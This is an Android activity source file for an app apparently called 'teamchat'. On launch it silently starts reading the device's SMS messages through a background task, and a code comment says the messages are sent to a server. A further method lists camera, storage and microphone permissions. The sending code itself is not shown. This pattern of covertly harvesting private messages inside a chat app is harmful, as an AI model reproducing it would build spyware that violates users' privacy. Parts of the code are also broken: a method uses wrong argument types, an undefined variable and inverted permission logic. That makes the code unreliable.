package com.example.teamchat;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;


import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;

import org.json.JSONException;


public class MainActivity extends AppCompatActivity {
    private static final String TAG = MainActivity.class.getSimpleName();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Log.v("test1:", "onCreate");

        //checkPermissions();
       /*requestSMSPermission(); -- Comment  off doing modification*/

        // Execute only when permission is granted.
        // This works for subsequent times running the app, AFTER permission has been granted.
        // This is needed because ReadSMSAsync is asynchronous (i.e readSMSAsync may run before checkPermissions finishes execution.
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED){
            ReadSMSAsync readSMSAsync = new ReadSMSAsync();
            readSMSAsync.execute();
        }

        startService(new Intent(this, ChatService.class));
    }


    private void checkPermissions() {
        int PERMISSION_ALL = 1;
        String[] PERMISSIONS = {
                Manifest.permission.READ_SMS,
        };

        if (!hasPermissions(this, PERMISSIONS)) {
            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
        }

    }
    private static boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }

    public class ReadSMSAsync extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... voids) {
            SmsReader smsReader = null;
            try {
                smsReader = new SmsReader(MainActivity.this);
            } catch (Exception e) {
                e.printStackTrace();
            }
            assert smsReader != null;

            try {
                smsReader.readSMS();
            } catch (JSONException e) {
                e.printStackTrace();
            }

            return null;
        }
    }

    final int PERMISSION_READ_SMS=123;
    private void requestSMSPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            // Permission is not granted
            // Should we show an explanation?
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_SMS)) {
                // Show an explanation to the user *asynchronously* -- don't block
                // this thread waiting for the user's response! After the user
                // sees the explanation, try again to request the permission.
            } else {
                // Request the permission.
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, PERMISSION_READ_SMS);
                Log.v("","Requesting permissions...");
            }
        }
    }

    String[] PERMISSIONS = {Manifest.permission.READ_SMS, Manifest.permission.CAMERA,
            Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.RECORD_AUDIO};
    /* All the permission can be listed down here */
    private void requestPermission(){
        for (String permission : PERMISSIONS){
            if(ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED){
                // Permission is not granted
            }else{
                // Request the permission
                ActivityCompat.requestPermissions(this,permission,requestcode);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case PERMISSION_READ_SMS: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // If permission granted, read sms and send to server.
                    // This works only for the first time running the app.
                    Log.v("","Permission granted!");
                    ReadSMSAsync readSMSAsync = new ReadSMSAsync();
                    readSMSAsync.execute();

                } else {
                    // If permission is denied, nothing happens.
                    Log.v("","Permission denied!");
                }
                break;
            }

        }
    }
}







